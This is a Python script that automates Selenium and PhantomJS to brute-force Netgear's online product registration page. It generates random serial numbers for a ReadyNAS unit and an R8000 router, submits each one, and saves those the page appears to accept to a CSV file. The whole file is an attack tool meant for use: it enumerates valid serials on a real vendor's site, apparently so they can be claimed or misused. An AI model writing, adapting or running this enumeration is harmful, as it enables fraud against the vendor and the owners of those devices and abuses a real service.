import requests
import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import random
import time
import csv

def GenerateSerial(product):
    if product == 1:
        return "20S" + RandomNumber(3) + "RV" + RandomNumber(5)
    elif product == 2:
        return "123" + RandomNumber(4)

def Bruteforce():

    validserials = []
    counter = input("Enter desired number of attempts:")
    product = input("Select desired product:\n" + " (1) ReadyNASRNDP6000" + "  (2) R8000 Router" + "\n")
    print "Working........ DO NOT CLOSE THIS WINDOW"
    driver = webdriver.PhantomJS(r"phantomjs-1.9.8-windows\phantomjs.exe")
    for x in range (0,counter):

        driver.get("https://my.netgear.com/register/register.aspx")
        serial = GenerateSerial(product)
        driver.find_element_by_id("ContentPlaceHolder1_txtSerial").send_keys(serial)
        driver.find_element_by_id("ContentPlaceHolder1_txtFirstname").click()
        driver.save_screenshot('screen.png')
        time.sleep(5)

        if IsElementPresent(driver):
            #Add to our valid serials list.
            validserials.append(serial)


    WriteOut(validserials)
    driver.close()
    print "Valid serials can be found in output.csv, in the same directory in which you ran this program"


def RandomNumber(count):
    serial = ""
    for i in range(count):
        serial = serial + str(random.randrange(1,10))
    return serial

def IsElementPresent(webdriver):
    try:
        webdriver.find_element_by_xpath("/html/body/form/div[3]/main/section/div/section/div/section/div/div[1]/div/div/div/div[8]/div/div/strong/p/label")
        return True
    except:
        return False


def WriteOut(validserials):
	output = open("output.csv", 'wb')
	wr = csv.writer(output, quoting=csv.QUOTE_ALL)
	wr.writerow(validserials)
    

Bruteforce()

